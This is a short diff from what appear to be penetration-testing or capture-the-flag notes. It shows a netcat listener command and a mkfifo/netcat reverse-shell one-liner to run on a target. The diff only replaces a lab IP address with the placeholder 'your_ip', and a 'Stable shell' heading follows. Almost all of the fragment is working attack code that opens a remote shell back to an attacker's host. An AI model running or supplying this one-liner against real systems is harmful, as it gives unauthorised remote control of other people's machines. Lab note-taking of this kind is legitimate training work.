@@ -61,7 +61,7 @@ $nc -lvp 1234
 
 -on target :
 
-$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.92 1234 >/tmp/f
+$rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc your_ip 1234 >/tmp/f
 
 
 ## Stable shell :
